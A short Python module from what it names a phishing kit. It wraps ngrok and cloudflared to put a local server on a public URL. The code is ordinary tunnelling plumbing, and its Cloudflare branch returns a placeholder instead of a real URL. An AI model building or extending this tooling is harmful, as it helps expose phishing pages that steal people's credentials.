"""
PhishKit — Tunnel provider (ngrok / Cloudflare)
"""

import subprocess
import threading
import time
import requests
import json


class TunnelManager:
    def __init__(self, provider="ngrok", local_port=8080, auth_token=None):
        self.provider = provider
        self.local_port = local_port
        self.auth_token = auth_token
        self.public_url = None
        self.process = None

    def start(self):
        if self.provider == "ngrok":
            return self._start_ngrok()
        elif self.provider == "cloudflare":
            return self._start_cloudflare()
        return None

    def _start_ngrok(self):
        if self.auth_token:
            subprocess.run(["ngrok", "authtoken", self.auth_token], capture_output=True)
        
        self.process = subprocess.Popen(
            ["ngrok", "http", str(self.local_port), "--log=stdout"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        time.sleep(3)
        
        # Get public URL from ngrok API
        try:
            resp = requests.get("http://127.0.0.1:4040/api/tunnels")
            data = resp.json()
            self.public_url = data["tunnels"][0]["public_url"]
        except:
            pass
        
        return self.public_url

    def _start_cloudflare(self):
        self.process = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", f"http://localhost:{self.local_port}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        time.sleep(5)
        # cloudflared usually prints the URL to stderr
        # In a real tool, we'd parse it properly
        return f"http://localhost:{self.local_port} (via cloudflared)"

    def stop(self):
        if self.process:
            self.process.terminate()
            self.process = None

    def get_url(self):
        return self.public_url
